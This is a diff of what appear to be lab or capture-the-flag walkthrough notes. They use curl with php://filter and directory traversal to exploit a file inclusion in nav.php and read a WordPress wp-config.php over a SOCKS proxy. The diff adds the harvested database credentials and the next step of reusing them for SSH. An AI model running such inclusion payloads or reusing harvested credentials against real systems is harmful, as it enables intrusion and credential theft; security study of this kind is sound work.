@@ -133,5 +133,11 @@ curl "http://172.16.1.10/nav.php?page=php://filter/php://filter/convert.iconv.UT
 Grep the wp-config file (requires base64 encoding due to include statement):
 ```bash
 curl "http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../../../../../../../../../../var/www/html/wordpress/wp-config.php" --socks5 localhost:1080
+
+# /** MySQL database username */
+# define( 'DB_USER', 'margaret' );
+
+# /** MySQL database password */
+# define( 'DB_PASSWORD', 'Welcome1!2@3#' );
 ```
 => Use margarets creds to connect to SSH
